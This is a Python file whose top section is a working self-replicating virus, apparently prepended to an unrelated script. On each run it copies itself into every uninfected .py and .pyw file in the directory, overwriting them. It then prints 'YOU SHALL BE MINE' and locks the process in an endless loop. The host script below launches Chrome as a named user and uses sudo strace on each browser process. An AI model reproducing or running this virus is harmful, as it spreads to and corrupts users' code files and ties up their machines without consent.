# I CAST MIRROR IMAGE!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# I CAST MIRROR IMAGE!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# I TAKE MY TIME BACK\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# I CAST MIRROR IMAGE!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU SHALL BE MINE")
    while True:
        pass

malicious_code()

# I TAKE MY TIME BACK

import os
import sys
from subprocess import Popen


line_count = 10
outfile = 'foo.txt'
cmd = 'sudo timeout 10 strace -p {} -o temp.out | cat temp.out | tail -{} > {}'
tab_sites = ['www.google.com', 'www.yahoo.com', 'www.msn.com']


for site in tab_sites:
    chrome_proc = Popen(['runuser', '-u', sys.argv[1], 'google-chrome-stable', site])
    print(chrome_proc.pid)
    os.system(cmd.format(chrome_proc.pid, line_count, outfile))